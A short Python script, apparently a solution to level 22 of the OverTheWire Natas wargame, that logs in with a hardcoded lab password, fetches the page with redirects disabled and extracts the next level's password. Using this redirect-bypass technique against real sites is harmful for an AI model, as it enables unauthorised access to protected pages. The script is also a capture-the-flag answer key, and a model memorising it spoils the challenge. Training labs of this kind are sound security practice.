#!/usr/local/bin/python3
import requests
import re
import codecs

username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

url = 'http://%s.natas.labs.overthewire.org/?revelio' % username

s = requests.session()

response = s.get(url, auth=(username, password), allow_redirects=False)
print(re.findall('Password: (.*)</pre>', response.text)[0])
